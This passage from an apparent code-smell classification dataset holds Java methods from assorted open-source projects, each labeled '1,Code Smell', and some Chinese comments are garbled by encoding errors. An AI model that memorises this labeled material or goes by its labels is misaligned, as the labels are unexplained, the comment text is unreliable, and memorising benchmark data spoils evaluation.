    replaceNullStackEntryProducers(invocationClazz,invocationMethod,invocationCodeAttribute,invocationOffset,stackEntryIndex);
  }
}",1,Code Smell
"/** 
 * Compares the catches of two blocks for equality. This includes both the catch types and target labels.
 * @param block1 {@code non-null;} one block to compare
 * @param block2 {@code non-null;} the other block to compare
 * @return {@code true} if the two blocks' non-primary successorsare identical
 */
public boolean catchesEqual(BasicBlock block1,BasicBlock block2){
  TypeList catches1=block1.getExceptionHandlerTypes();
  TypeList catches2=block2.getExceptionHandlerTypes();
  if (!StdTypeList.equalContents(catches1,catches2)) {
    return false;
  }
  IntList succ1=block1.getSuccessors();
  IntList succ2=block2.getSuccessors();
  int size=succ1.size();
  int primary1=block1.getPrimarySuccessor();
  int primary2=block2.getPrimarySuccessor();
  if (((primary1 == -1) || (primary2 == -1)) && (primary1 != primary2)) {
    return false;
  }
  for (int i=0; i < size; i++) {
    int label1=succ1.get(i);
    int label2=succ2.get(i);
    if (label1 == primary1) {
      if (label2 != primary2) {
        return false;
      }
      continue;
    }
    if (label1 != label2) {
      return false;
    }
  }
  return true;
}",1,Code Smell
"@Override public boolean action(Request request,Response response){
  if (request.getNettyRequest() instanceof FullHttpRequest) {
    SystemSettingPojo inputUserId=getRequestBody(request.getNettyRequest(),SystemSettingPojo.class);
    if (inputUserId != null && (!StringUtil.isNullOrEmpty(inputUserId.value) || !StringUtil.isNullOrEmpty(inputUserId.desc))) {
      boolean success=messagesStore.updateSystemSetting(inputUserId.id,inputUserId.value,inputUserId.desc);
      RestResult result;
      if (!success) {
        result=RestResult.resultOf(ErrorCode.ERROR_CODE_SERVER_ERROR);
      }
 else {
        result=RestResult.ok();
      }
      setResponseContent(result,response);
    }
 else {
      setResponseContent(RestResult.resultOf(ErrorCode.INVALID_PARAMETER),response);
    }
  }
  return true;
}
",1,Code Smell
"@Override public boolean prepareInventory(GeyserSession session,Inventory inventory){
  if (session.getLastInteractionPlayerPosition().equals(session.getPlayerEntity().getPosition())) {
    BlockState state=session.getGeyser().getWorldManager().blockAt(session,session.getLastInteractionBlockPosition());
    if (!BlockRegistries.CUSTOM_BLOCK_STATE_OVERRIDES.get().containsKey(state.javaId())) {
      if ((state.block() == Blocks.CHEST || state.block() == Blocks.TRAPPED_CHEST) && state.getValue(Properties.CHEST_TYPE) != ChestType.SINGLE) {
        inventory.setHolderPosition(session.getLastInteractionBlockPosition());
        ((Container)inventory).setUsingRealBlock(true,state.block());
        NbtMapBuilder tag=BlockEntityTranslator.getConstantBedrockTag(""Chest"",session.getLastInteractionBlockPosition()).putString(""CustomName"",inventory.getTitle());
        DoubleChestBlockEntityTranslator.translateChestValue(tag,state,session.getLastInteractionBlockPosition().getX(),session.getLastInteractionBlockPosition().getZ());
        BlockEntityDataPacket dataPacket=new BlockEntityDataPacket();
        dataPacket.setData(tag.build());
        dataPacket.setBlockPosition(session.getLastInteractionBlockPosition());
        session.sendUpstreamPacket(dataPacket);
        return true;
      }
    }
  }
  Vector3i position=InventoryUtils.findAvailableWorldSpace(session);
  if (position == null) {
    return false;
  }
  Vector3i pairPosition=position.add(Vector3i.UNIT_X);
  BlockDefinition definition=session.getBlockMappings().getVanillaBedrockBlock(defaultJavaBlockState);
  UpdateBlockPacket blockPacket=new UpdateBlockPacket();
  blockPacket.setDataLayer(0);
  blockPacket.setBlockPosition(position);
  blockPacket.setDefinition(definition);
  blockPacket.getFlags().addAll(UpdateBlockPacket.FLAG_ALL_PRIORITY);
  session.sendUpstreamPacket(blockPacket);
  NbtMap tag=BlockEntityTranslator.getConstantBedrockTag(""Chest"",position).putInt(""pairx"",pairPosition.getX()).putInt(""pairz"",pairPosition.getZ()).putString(""CustomName"",inventory.getTitle()).build();
  BlockEntityDataPacket dataPacket=new BlockEntityDataPacket();
  dataPacket.setData(tag);
  dataPacket.setBlockPosition(position);
  session.sendUpstreamPacket(dataPacket);
  blockPacket=new UpdateBlockPacket();
  blockPacket.setDataLayer(0);
  blockPacket.setBlockPosition(pairPosition);
  blockPacket.setDefinition(definition);
  blockPacket.getFlags().addAll(UpdateBlockPacket.FLAG_ALL_PRIORITY);
  session.sendUpstreamPacket(blockPacket);
  tag=NbtMap.builder().putString(""id"",""Chest"").putInt(""x"",pairPosition.getX()).putInt(""y"",pairPosition.getY()).putInt(""z"",pairPosition.getZ()).putInt(""pairx"",position.getX()).putInt(""pairz"",position.getZ()).putString(""CustomName"",inventory.getTitle()).build();
  dataPacket=new BlockEntityDataPacket();
  dataPacket.setData(tag);
  dataPacket.setBlockPosition(pairPosition);
  session.sendUpstreamPacket(dataPacket);
  inventory.setHolderPosition(position);
  return true;
}",1,Code Smell
"@Override public void transferFieldList(List<CrmMarketingField> recordList,Integer isDetail){
  recordList.forEach(record -> {
    Integer dataType=record.getType();
    if (isDetail == 2) {
      if (FieldEnum.USER.getType().equals(dataType)) {
        if (ObjectUtil.isNotEmpty(record.getValue())) {
          List<SimpleUser> listResult=UserCacheUtil.getSimpleUsers(TagUtil.toLongSet((String)record.getValue()));
          record.setValue(listResult);
        }
      }
 else       if (FieldEnum.STRUCTURE.getType().equals(dataType)) {
        if (ObjectUtil.isNotEmpty(record.getValue())) {
          Result<List<SimpleDept>> listResult=adminService.queryDeptByIds(TagUtil.toSet((String)record.getValue()));
          record.setValue(listResult.getData());
        }
      }
 else       if (FieldEnum.CHECKBOX.getType().equals(dataType)) {
        if (ObjectUtil.isNotEmpty(record.getValue())) {
          String[] split=StrUtil.split((String)record.getValue(),"","");
          record.setValue(split);
        }
      }
    }
 else {
      if (FieldEnum.USER.getType().equals(dataType)) {
        if (ObjectUtil.isNotEmpty(record.getValue())) {
          List<SimpleUser> listResult=UserCacheUtil.getSimpleUsers(TagUtil.toLongSet((String)record.getValue()));
          String value=listResult.stream().map(SimpleUser::getRealname).collect(Collectors.joining("",""));
          record.setValue(value);
        }
      }
 else       if (FieldEnum.STRUCTURE.getType().equals(dataType)) {
        if (ObjectUtil.isNotEmpty(record.getValue())) {
          Result<List<SimpleDept>> listResult=adminService.queryDeptByIds(TagUtil.toSet((String)record.getValue()));
          String value=listResult.getData().stream().map(SimpleDept::getName).collect(Collectors.joining("",""));
          record.setValue(value);
        }
      }
    }
    if (dataType.equals(FieldEnum.FILE.getType())) {
      if (ObjectUtil.isNotEmpty(record.getValue())) {
        Result<List<FileEntity>> fileList=adminFileService.queryFileList((String)record.getValue());
        record.setValue(fileList.getData());
      }
    }
  }
);
}",1,Code Smell
"private void initializeStatusFields(TransactionInput txInput,PSBTInput psbtInput){
  updateSignatures(psbtInput);
  Transaction transaction=inputForm.getTransaction();
  rbf.setSelected(txInput.isReplaceByFeeEnabled());
  rbf.selectedProperty().addListener((observable,oldValue,newValue) -> {
    if (newValue) {
      if (txInput.isAbsoluteTimeLockDisabled()) {
        locktimeToggleGroup.selectToggle(locktimeAbsoluteType);
      }
 else       if (txInput.isAbsoluteTimeLocked()) {
        txInput.setSequenceNumber(TransactionInput.SEQUENCE_RBF_ENABLED);
        if (oldValue != null) {
          EventManager.get().post(new TransactionChangedEvent(transaction));
        }
      }
    }
 else {
      if (txInput.isAbsoluteTimeLocked()) {
        txInput.setSequenceNumber(TransactionInput.SEQUENCE_LOCKTIME_DISABLED - 1);
        if (oldValue != null) {
          EventManager.get().post(new TransactionChangedEvent(transaction));
        }
      }
 else       if (txInput.isRelativeTimeLocked()) {
        locktimeToggleGroup.selectToggle(locktimeAbsoluteType);
      }
    }
  }
);
  rbf.setDisable(!inputForm.isEditable());
}",1,Code Smell
"/** 
 * 鏌ヨ鍓嶅彴鍏捣鍒楄〃
 */
@Override public List<CrmCustomerPool> queryPoolNameListByAuth(){
  UserInfo user=UserUtil.getUser();
  List<CrmCustomerPool> list=lambdaQuery().select(CrmCustomerPool::getPoolId,CrmCustomerPool::getPoolName,CrmCustomerPool::getMemberUserId,CrmCustomerPool::getAdminUserId,CrmCustomerPool::getMemberDeptId).eq(CrmCustomerPool::getStatus,1).orderByDesc(CrmCustomerPool::getCreateTime).list();
  if (!UserUtil.isAdmin()) {
    list.removeIf(pool -> {
      boolean isAdmin=StrUtil.splitTrim(pool.getAdminUserId(),Const.SEPARATOR).contains(user.getUserId().toString());
      boolean isMember=StrUtil.splitTrim(pool.getMemberUserId(),Const.SEPARATOR).contains(user.getUserId().toString());
      boolean isDept=StrUtil.splitTrim(pool.getMemberDeptId(),Const.SEPARATOR).contains(user.getDeptId().toString());
      return !isAdmin && !isMember && !isDept;
    }
);
  }
  list.forEach(pool -> {
    pool.setMemberDeptId(null);
    pool.setMemberUserId(null);
    pool.setAdminUserId(null);
  }
);
  return list;
}",1,Code Smell
"protected boolean findInterface(MovementContext context,BlockPos pos){
  if (context.contraption instanceof CarriageContraption && !cc.notInPortal())   return false;
  Optional<Direction> currentFacingIfValid=getCurrentFacingIfValid(context);
  if (!currentFacingIfValid.isPresent())   return false;
  Direction currentFacing=currentFacingIfValid.get();
  PortableStorageInterfaceBlockEntity psi=findStationaryInterface(context.world,pos,context.state,currentFacing);
  if (psi == null)   return false;
  if (psi.isPowered())   return false;
  context.data.put(_workingPos_,NbtUtils.writeBlockPos(psi.getBlockPos()));
  if (!context.world.isClientSide) {
    Vec3 diff=VecHelper.getCenterOf(psi.getBlockPos()).subtract(context.position);
    diff=VecHelper.project(diff,Vec3.atLowerCornerOf(currentFacing.getNormal()));
    float distance=(float)(diff.length() + 1.85f - 1);
    psi.startTransferringTo(context.contraption,distance);
  }
 else {
    context.data.put(_clientPrevPos_,NbtUtils.writeBlockPos(pos));
    if (context.contraption instanceof CarriageContraption || context.contraption.entity.isStalled() || context.motion.lengthSqr() == 0)     getAnimation(context).chase(psi.getConnectionDistance() / 2,0.25f,Chaser.LINEAR);
  }
  return true;
}",1,Code Smell
"@Override protected boolean onExecute(String verb,String parameter,MissionInit missionInit){
  if (!verb.equalsIgnoreCase(""place""))   return false;
  EntityPlayerSP player=Minecraft.getMinecraft().player;
  if (player == null)   return false;
  Item item=Item.getByNameOrId(parameter);
  Block block=Block.getBlockFromItem(item);
  if (item == null || item.getRegistryName() == null || block.getRegistryName() == null)   return false;
  InventoryPlayer inv=player.inventory;
  boolean blockInInventory=false;
  ItemStack stackInInventory=null;
  int stackIndex=-1;
  for (int i=0; !blockInInventory && i < inv.getSizeInventory(); i++) {
    Item stack=inv.getStackInSlot(i).getItem();
    if (stack.getRegistryName() != null && stack.getRegistryName().equals(item.getRegistryName())) {
      stackInInventory=inv.getStackInSlot(i);
      stackIndex=i;
      blockInInventory=true;
    }
  }
  if (!blockInInventory)   return true;
  RayTraceResult mop=Minecraft.getMinecraft().objectMouseOver;
  if (mop != null && mop.typeOfHit == RayTraceResult.Type.BLOCK) {
    BlockPos pos=mop.getBlockPos().add(mop.sideHit.getDirectionVec());
    AxisAlignedBB axisalignedbb=block.getDefaultState().getCollisionBoundingBox(player.world,pos);
    if (axisalignedbb == null || player.world.checkNoEntityCollision(axisalignedbb.offset(pos),null)) {
      MalmoMod.network.sendToServer(new PlaceMessage(mop.getBlockPos(),new ItemStack(block),stackIndex,mop.sideHit,mop.hitVec));
    }
  }
  return true;
}",1,Code Smell
"public void initializeView(){
  List<KeystoreImport> importers=List.of(new Bip39(),new Electrum(),new Bip32());
  for (  KeystoreImport importer : importers) {
    if (importer.isDeprecated() && !Config.get().isShowDeprecatedImportExport()) {
      continue;
    }
    TitledDescriptionPane importPane=null;
    if (importer instanceof KeystoreFileImport) {
      importPane=new FileKeystoreImportPane(getMasterController().getWallet(),(KeystoreFileImport)importer,getMasterController().getRequiredDerivation());
    }
 else     if (importer instanceof KeystoreMnemonicImport) {
      importPane=new MnemonicKeystoreImportPane(getMasterController().getWallet(),(KeystoreMnemonicImport)importer,getMasterController().getDefaultDerivation());
    }
 else     if (importer instanceof KeystoreXprvImport) {
      importPane=new XprvKeystoreImportPane(getMasterController().getWallet(),(KeystoreXprvImport)importer,getMasterController().getDefaultDerivation());
    }
 else {
      throw new IllegalArgumentException(""Could not create ImportPane for importer of type "" + importer.getClass());
    }
    importAccordion.getPanes().add(importPane);
  }
}",1,Code Smell
"final void callObjcNotifyInit(UnidbgPointer _objcNotifyInit){
  if (_objcNotifyInit != null && !objcNotifyInit && objcNotifyMapped) {
    SvcMemory svcMemory=emulator.getSvcMemory();
    Module.emulateFunction(emulator,_objcNotifyInit.peer,createPathMemory(svcMemory),machHeader);
    objcNotifyInit=true;
  }
}
",1,Code Smell
"@Override protected void onActivityResult(int requestCode,int resultCode,Intent data){
  if (requestCode == REQUEST_CODE_PICK_IMAGE && resultCode == Activity.RESULT_OK && data != null) {
    ArrayList<ImageItem> images=(ArrayList<ImageItem>)data.getSerializableExtra(ImagePicker.EXTRA_RESULT_ITEMS);
    if (images != null && images.size() > 0) {
      portraitPath=images.get(0).path;
      Glide.with(this).load(portraitPath).apply(new RequestOptions().placeholder(R.mipmap.avatar_def).centerCrop()).into(portraitImageView);
    }
  }
 else {
    super.onActivityResult(requestCode,resultCode,data);
  }
}",1,Code Smell
"private DefaultContentMetadata createContentMetadata(Object... pairs){
  assertThat(pairs.length % 2).isEqualTo(0);
  ContentMetadataMutations mutations=new ContentMetadataMutations();
  for (int i=0; i < pairs.length; i+=2) {
    String name=(String)pairs[i];
    Object value=pairs[i + 1];
    if (value instanceof String) {
      mutations.set(name,(String)value);
    }
 else     if (value instanceof byte[]) {
      mutations.set(name,(byte[])value);
    }
 else     if (value instanceof Number) {
      mutations.set(name,((Number)value).longValue());
    }
 else {
      throw new IllegalArgumentException();
    }
  }
  return DefaultContentMetadata.EMPTY.copyWithMutationsApplied(mutations);
}",1,Code Smell
"/** 
 * 鎵цbean鐨勫垵濮嬪寲鏂规硶
 * @param beanName
 * @param bean
 * @param beanDefinition
 * @throws Throwable
 */
protected void invokeInitMethods(String beanName,Object bean,BeanDefinition beanDefinition) throws Throwable {
  if (bean instanceof InitializingBean) {
    ((InitializingBean)bean).afterPropertiesSet();
  }
  String initMethodName=beanDefinition.getInitMethodName();
  if (StrUtil.isNotEmpty(initMethodName) && !(bean instanceof InitializingBean && ""afterPropertiesSet"".equals(initMethodName))) {
    Method initMethod=ClassUtil.getPublicMethod(beanDefinition.getBeanClass(),initMethodName);
    if (initMethod == null) {
      throw new BeansException(""Could not find an init method named '"" + initMethodName + ""' on bean with name '""+ beanName+ ""'"");
    }
    initMethod.invoke(bean);
  }
}
",1,Code Smell
"public static FullScreenDialog show(OnBindView<FullScreenDialog> onBindView){
  FullScreenDialog FullScreenDialog=new FullScreenDialog(onBindView);
  FullScreenDialog.show();
  return FullScreenDialog;
}
public FullScreenDialog show(){
  if (isHide && getDialogView() != null && isShow) {
    if (hideWithExitAnim && getDialogImpl() != null) {
      getDialogView().setVisibility(View.VISIBLE);
      getDialogImpl().getDialogXAnimImpl().doShowAnim(me,getDialogImpl().bkg);
    }
 else {
      getDialogView().setVisibility(View.VISIBLE);
    }
    return this;
  }
  super.beforeShow();
  if (getDialogView() == null) {
    View dialogView=createView(isLightTheme() ? R.layout.layout_dialogx_fullscreen : R.layout.layout_dialogx_fullscreen_dark);
    dialogImpl=new DialogImpl(dialogView);
    if (dialogView != null)     dialogView.setTag(me);
    show(dialogView);
  }
 else {
    show(getDialogView());
  }
  return this;
}
public void show(Activity activity){
  super.beforeShow();
  if (getDialogView() == null) {
    View dialogView=createView(isLightTheme() ? R.layout.layout_dialogx_fullscreen : R.layout.layout_dialogx_fullscreen_dark);
    dialogImpl=new DialogImpl(dialogView);
    if (dialogView != null)     dialogView.setTag(me);
    show(activity,dialogView);
  }
 else {
    show(activity,getDialogView());
  }
}
",1,Code Smell
"protected Vector3f getFluidGravity(double gravity,boolean falling){
  Vector3f motion=vehicle.getMotion();
  if (gravity != 0 && !vehicle.getFlag(EntityFlag.SPRINTING)) {
    float newY=(float)(motion.getY() - gravity / 16);
    if (falling && Math.abs(motion.getY() - 0.005f) >= MIN_VELOCITY && Math.abs(newY) < MIN_VELOCITY) {
      newY=-MIN_VELOCITY;
    }
    return Vector3f.from(motion.getX(),newY,motion.getZ());
  }
  return motion;
}",1,Code Smell
"void selectChildView(ViewHolder rowViewHolder,View view,boolean fireEvent){
  if (view != null) {
    if (rowViewHolder.mSelected) {
      ItemBridgeAdapter.ViewHolder ibh=(ItemBridgeAdapter.ViewHolder)rowViewHolder.mGridView.getChildViewHolder(view);
      if (mHoverCardPresenterSelector != null) {
        rowViewHolder.mHoverCardViewSwitcher.select(rowViewHolder.mGridView,view,ibh.mItem);
      }
      if (fireEvent && rowViewHolder.getOnItemViewSelectedListener() != null) {
        rowViewHolder.getOnItemViewSelectedListener().onItemSelected(ibh.mHolder,ibh.mItem,rowViewHolder,rowViewHolder.mRow);
      }
    }
  }
 else {
    if (mHoverCardPresenterSelector != null) {
      rowViewHolder.mHoverCardViewSwitcher.unselect();
    }
    if (fireEvent && rowViewHolder.getOnItemViewSelectedListener() != null) {
      rowViewHolder.getOnItemViewSelectedListener().onItemSelected(null,null,rowViewHolder,rowViewHolder.mRow);
    }
  }
}
",1,Code Smell
"/** 
 * Ensures that an expression has a given  {@link SqlTypeName}, applying a cast if necessary. If the expression already has the right type family, returns the expression unchanged. 
 */
private RexNode ensureSqlType(RelDataType type,RexNode node){
  if (type.getSqlTypeName() == node.getType().getSqlTypeName() || (type.getSqlTypeName() == SqlTypeName.VARCHAR && node.getType().getSqlTypeName() == SqlTypeName.CHAR)) {
    return node;
  }
  return rexBuilder.ensureType(type,node,true);
}
",1,Code Smell
"private void doSearchMessages(BaseFragment fragment,CountDownLatch latch,ArrayList<Integer> messageIds,TLRPC.InputPeer peer,int replyMessageId,TLRPC.InputPeer fromId,int before,int offsetId,long hash){
  var req=new TLRPC.TL_messages_search();
  req.peer=peer;
  req.limit=100;
  req.q="""";
  req.offset_id=offsetId;
  req.from_id=fromId;
  req.flags|=1;
  req.filter=new TLRPC.TL_inputMessagesFilterEmpty();
  if (replyMessageId != 0) {
    req.top_msg_id=replyMessageId;
    req.flags|=2;
  }
  req.hash=hash;
  getConnectionsManager().sendRequest(req,(response,error) -> {
    if (response instanceof TLRPC.messages_Messages) {
      var res=(TLRPC.messages_Messages)response;
      if (response instanceof TLRPC.TL_messages_messagesNotModified || res.messages.isEmpty()) {
        latch.countDown();
        return;
      }
      var newOffsetId=offsetId;
      for (      TLRPC.Message message : res.messages) {
        newOffsetId=Math.min(newOffsetId,message.id);
        if (!message.out || message.post || message.date >= before) {
          continue;
        }
        messageIds.add(message.id);
      }
      doSearchMessages(fragment,latch,messageIds,peer,replyMessageId,fromId,before,newOffsetId,calcMessagesHash(res.messages));
    }
 else {
      if (error != null) {
        AndroidUtilities.runOnUIThread(() -> AlertsCreator.showSimpleAlert(fragment,LocaleController.getString(""ErrorOccurred"",R.string.ErrorOccurred) + ""\n"" + error.text));
      }
      latch.countDown();
    }
  }
,ConnectionsManager.RequestFlagFailOnServerErrors);
}",1,Code Smell
"private static void checkSupportFastLoad(Result result){
  try {
    Method getPropertyMethod=Class.forName(""android.os.SystemProperties"").getDeclaredMethod(""get"",String.class,String.class);
    if (Build.VERSION.SDK_INT >= 19) {
      String vmLibName=(String)getPropertyMethod.invoke(null,""persist.sys.dalvik.vm.lib"",null);
      result.vmLibName=vmLibName;
      Monitor.get().logInfo(""VM lib is "" + vmLibName);
      if (""libart.so"".equals(vmLibName)) {
        Monitor.get().logWarning(""VM lib is art, skip!"");
        return;
      }
    }
    String yunosVersion=(String)getPropertyMethod.invoke(null,""ro.yunos.version"",null);
    if (yunosVersion != null && !yunosVersion.isEmpty() || new File(Constants.LIB_YUNOS_PATH).exists()) {
      result.isYunOS=true;
      Monitor.get().logWarning(""Yun os is "" + yunosVersion + "", skip boost!"");
      return;
    }
    supportFastLoadDex=initialize(Build.VERSION.SDK_INT,RuntimeException.class);
    result.supportFastLoadDex=supportFastLoadDex;
  }
 catch (  Throwable tr) {
    result.addUnFatalThrowable(tr);
    Monitor.get().logWarning(""Fail to init"",tr);
  }
}",1,Code Smell
"@Override protected void updateItem(UtxoEntry.AddressStatus addressStatus,boolean empty){
  super.updateItem(addressStatus,empty);
  UtxoEntry utxoEntry=addressStatus == null ? null : addressStatus.getUtxoEntry();
  EntryCell.applyRowStyles(this,utxoEntry);
  if (empty) {
    setText(null);
    setGraphic(null);
  }
 else {
    if (utxoEntry != null) {
      Address address=addressStatus.getAddress();
      setText(address.toString());
      setContextMenu(new EntryCell.AddressContextMenu(address,utxoEntry.getOutputDescriptor(),new NodeEntry(utxoEntry.getWallet(),utxoEntry.getNode()),false,getTreeTableView()));
      Tooltip tooltip=new Tooltip();
      tooltip.setShowDelay(Duration.millis(250));
      tooltip.setText(getTooltipText(utxoEntry,addressStatus.isDuplicate(),addressStatus.isDustAttack()));
      setTooltip(tooltip);
      if (addressStatus.isDustAttack()) {
        setGraphic(getDustAttackHyperlink(utxoEntry));
      }
 else       if (addressStatus.isDuplicate()) {
        setGraphic(getDuplicateGlyph());
      }
 else {
        setGraphic(null);
      }
    }
  }
}",1,Code Smell
"private void callListenerOnRelease(final Key key,final int primaryCode,final boolean withSliding){
  if (sInGesture || mIsDetectingGesture || mIsTrackingForActionDisabled) {
    return;
  }
  final boolean ignoreModifierKey=mIsInDraggingFinger && key.isModifier();
  if (DEBUG_LISTENER) {
    Log.d(TAG,String.format(Locale.US,""[%d] onRelease  : %s%s%s%s"",mPointerId,Constants.printableCode(primaryCode),withSliding ? "" sliding"" : """",ignoreModifierKey ? "" ignoreModifier"" : """",key.isEnabled() ? """" : "" disabled""));
  }
  if (ignoreModifierKey) {
    return;
  }
  if (key.isEnabled()) {
    sListener.onReleaseKey(primaryCode,withSliding);
  }
}
",1,Code Smell
"private void searchAnimated(String emoji){
  if (emoji == null) {
    return;
  }
  if (lastQuery != null && lastQueryType == 2 && lastQuery.equals(emoji) && !clear && keywordResults != null && !keywordResults.isEmpty()) {
    forceClose=false;
    createListView();
    if (containerView != null) {
      containerView.setVisibility(View.VISIBLE);
      containerView.invalidate();
    }
    return;
  }
  final int id=++lastQueryId;
  if (searchRunnable != null) {
    AndroidUtilities.cancelRunOnUIThread(searchRunnable);
  }
  searchRunnable=() -> {
    ArrayList<MediaDataController.KeywordResult> standard=new ArrayList<>(1);
    standard.add(new MediaDataController.KeywordResult(emoji,null));
    MediaDataController.getInstance(currentAccount).fillWithAnimatedEmoji(standard,15,false,() -> {
      if (id == lastQueryId) {
        lastQuery=emoji;
        lastQueryType=2;
        standard.remove(standard.size() - 1);
        if (!standard.isEmpty()) {
          clear=false;
          forceClose=false;
          createListView();
          if (containerView != null) {
            containerView.setVisibility(View.VISIBLE);
            containerView.invalidate();
          }
          keywordResults=standard;
          if (adapter != null) {
            adapter.notifyDataSetChanged();
          }
        }
 else {
          clear=true;
          forceClose();
        }
      }
    }
);
  }
;
  if (keywordResults == null || keywordResults.isEmpty()) {
    AndroidUtilities.runOnUIThread(searchRunnable,600);
  }
 else {
    searchRunnable.run();
  }
}",1,Code Smell
"public Object resolveArgument(MethodParameter parameter,ModelAndViewContainer mavContainer,NativeWebRequest webRequest,WebDataBinderFactory binderFactory){
  if (parameter.getParameterAnnotation(TokenToMallUser.class) instanceof TokenToMallUser) {
    MallUser mallUser=null;
    String token=webRequest.getHeader(""token"");
    if (null != token && !"""".equals(token) && token.length() == Constants.TOKEN_LENGTH) {
      MallUserToken mallUserToken=newBeeMallUserTokenMapper.selectByToken(token);
      if (mallUserToken == null || mallUserToken.getExpireTime().getTime() <= System.currentTimeMillis()) {
        NewBeeMallException.fail(ServiceResultEnum.TOKEN_EXPIRE_ERROR.getResult());
      }
      mallUser=mallUserMapper.selectByPrimaryKey(mallUserToken.getUserId());
      if (mallUser == null) {
        NewBeeMallException.fail(ServiceResultEnum.USER_NULL_ERROR.getResult());
      }
      if (mallUser.getLockedFlag().intValue() == 1) {
        NewBeeMallException.fail(ServiceResultEnum.LOGIN_USER_LOCKED_ERROR.getResult());
      }
      return mallUser;
    }
 else {
      NewBeeMallException.fail(ServiceResultEnum.NOT_LOGIN_ERROR.getResult());
    }
  }
  return null;
}",1,Code Smell
"protected void paintIcon(Graphics g,Rectangle iconRect,Icon icon,Color checkBackground,Color selectionBackground){
  if (menuItem.isSelected() && checkIcon != null && icon != checkIcon) {
    Rectangle r=FlatUIUtils.addInsets(iconRect,scale(checkMargins));
    g.setColor(FlatUIUtils.deriveColor(checkBackground,selectionBackground));
    g.fillRect(r.x,r.y,r.width,r.height);
  }
  paintIcon(g,menuItem,icon,iconRect);
}
protected static void paintIcon(Graphics g,JMenuItem menuItem,Icon icon,Rectangle iconRect){
  if (icon == null)   return;
  int x=iconRect.x + centerOffset(iconRect.width,icon.getIconWidth());
  int y=iconRect.y + centerOffset(iconRect.height,icon.getIconHeight());
  icon.paintIcon(menuItem,g,x,y);
}
@Override public void paintIcon(Component c,Graphics g,int x,int y){
}
",1,Code Smell
"protected void drawKeyPopupHint(@NonNull final Key key,@NonNull final Canvas canvas,@NonNull final Paint paint,@NonNull final KeyDrawParams params){
  if (TextUtils.isEmpty(mKeyPopupHintLetter)) {
    return;
  }
  final int keyWidth=key.getDrawWidth();
  final int keyHeight=key.getHeight();
  final float labelCharWidth=TypefaceUtils.getReferenceCharWidth(paint);
  final float hintX;
  final float hintBaseline=paint.ascent();
  paint.setTypeface(params.mTypeface);
  paint.setTextSize(params.mHintLetterSize);
  paint.setColor(params.mHintLabelColor);
  paint.setTextAlign(Align.CENTER);
  if (mColors.getThemeStyle().equals(STYLE_ROUNDED)) {
    if (key.getBackgroundType() == Key.BACKGROUND_TYPE_SPACEBAR)     hintX=keyWidth + hintBaseline + labelCharWidth * 0.1f;
 else     hintX=key.hasFunctionalBackground() || key.hasActionKeyBackground() ? keyWidth / 2.0f : keyWidth - mKeyHintLetterPadding - labelCharWidth / 2.0f;
  }
 else {
    hintX=keyWidth - mKeyHintLetterPadding - TypefaceUtils.getReferenceCharWidth(paint) / 2.0f;
  }
  final float hintY=keyHeight - mKeyPopupHintLetterPadding;
  canvas.drawText(mKeyPopupHintLetter,hintX,hintY,paint);
}",1,Code Smell
"private static boolean searchForClass(Exprent exprent,VarType classType){
  List<Exprent> lst=exprent.getAllExprents(true);
  lst.add(exprent);
  String classname=classType.value;
  for (  Exprent expr : lst) {
    boolean res=false;
switch (expr.type) {
case Exprent.EXPRENT_CONST:
      ConstExprent constExpr=(ConstExprent)expr;
    res=(VarType.VARTYPE_CLASS.equals(constExpr.getConstType()) && classname.equals(constExpr.getValue()) || classType.equals(constExpr.getConstType()));
  break;
case Exprent.EXPRENT_FIELD:
res=classname.equals(((FieldExprent)expr).getClassname());
break;
case Exprent.EXPRENT_INVOCATION:
res=classname.equals(((InvocationExprent)expr).getClassname());
break;
case Exprent.EXPRENT_NEW:
VarType newType=expr.getExprType();
res=newType.type == CodeConstants.TYPE_OBJECT && classname.equals(newType.value);
break;
case Exprent.EXPRENT_VAR:
VarExprent varExpr=(VarExprent)expr;
if (varExpr.isDefinition()) {
VarType varType=varExpr.getVarType();
if (classType.equals(varType) || (varType.arrayDim > 0 && classType.value.equals(varType.value))) {
res=true;
}
}
}
if (res) {
return true;
}
}
return false;
}",1,Code Smell
"/** 
 * 杞崲 appPackage锛屽鍔犻檮鍔犳暟鎹紝骞惰幏鍙栧疄闄呭競鍦洪渶瑕佺殑 Item 瀵硅薄
 * @param item             appPackage item
 * @param metaList         鍏冧俊鎭
 * @param countVersionList 鐗堟湰璁℃暟鍒楄〃
 * @return
 */
private MarketAppItemDTO transform(AppPackageDO item,List<AppMetaDO> metaList,List<AppPackageVersionCountDTO> countVersionList){
  AppPackageDTO mid=appPackageDtoConvert.to(item);
  if (Objects.nonNull(mid)) {
    AppMetaDO appMetaDO=metaList.stream().filter(m -> StringUtils.equals(m.getAppId(),mid.getAppId())).findFirst().orElse(null);
    if (Objects.nonNull(appMetaDO)) {
      JSONObject optionMap=appOptionService.getOptionMap(appMetaDO.getAppId());
      String name=appMetaDO.getAppId();
      if (StringUtils.isNotEmpty(optionMap.getString(""name""))) {
        name=optionMap.getString(""name"");
      }
      mid.setAppName(name);
      mid.setAppOptions(optionMap);
    }
  }
  MarketAppItemDTO result=new MarketAppItemDTO();
  ClassUtil.copy(mid,result);
  List<AppPackageVersionCountDTO> filteredCountVersion=countVersionList.stream().filter(countVersion -> item.getAppId().equals(countVersion.getAppId())).collect(Collectors.toList());
  if (filteredCountVersion.size() > 0) {
    result.setPackageCount(filteredCountVersion.get(0).getPackageCount());
  }
 else {
    result.setPackageCount(0L);
  }
  return result;
}",1,Code Smell
"@Override public void playerWillDestroy(Level worldIn,BlockPos pos,BlockState state,Player player){
  Axis axis=state.getValue(FACING).getAxis();
  Direction direction=Direction.get(AxisDirection.POSITIVE,axis);
  BlockPos pistonHead=null;
  BlockPos pistonBase=null;
  for (  int modifier : new int[]{1,-1}) {
    for (int offset=modifier; modifier * offset < MechanicalPistonBlock.maxAllowedPistonPoles(); offset+=modifier) {
      BlockPos currentPos=pos.relative(direction,offset);
      BlockState block=worldIn.getBlockState(currentPos);
      if (isExtensionPole(block) && axis == block.getValue(FACING).getAxis())       continue;
      if (isPiston(block) && block.getValue(BlockStateProperties.FACING).getAxis() == axis)       pistonBase=currentPos;
      if (isPistonHead(block) && block.getValue(BlockStateProperties.FACING).getAxis() == axis)       pistonHead=currentPos;
      break;
    }
  }
  if (pistonHead != null && pistonBase != null && worldIn.getBlockState(pistonHead).getValue(BlockStateProperties.FACING) == worldIn.getBlockState(pistonBase).getValue(BlockStateProperties.FACING)) {
    final BlockPos basePos=pistonBase;
    BlockPos.betweenClosedStream(pistonBase,pistonHead).filter(p -> !p.equals(pos) && !p.equals(basePos)).forEach(p -> worldIn.destroyBlock(p,!player.isCreative()));
